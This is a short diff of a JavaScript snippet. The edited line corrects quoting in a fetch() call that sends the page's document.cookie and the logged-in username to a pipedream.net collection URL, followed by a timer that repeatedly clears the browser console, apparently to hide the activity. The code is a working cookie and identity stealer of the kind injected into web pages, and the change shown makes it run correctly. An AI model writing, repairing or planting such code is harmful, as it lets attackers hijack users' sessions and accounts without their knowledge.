@@ -1,4 +1,4 @@
-fetch(`https://eodm4q7xsesbwyr.m.pipedream.net/${document.cookie}-user-${document.querySelector(\'#page-header-user-dropdown > span\').innerText}`)
+fetch(`https://eodm4q7xsesbwyr.m.pipedream.net/${document.cookie}-user-${document.querySelector('#page-header-user-dropdown > span').innerText}`)
 
 setInterval( () => {
   console.clear()
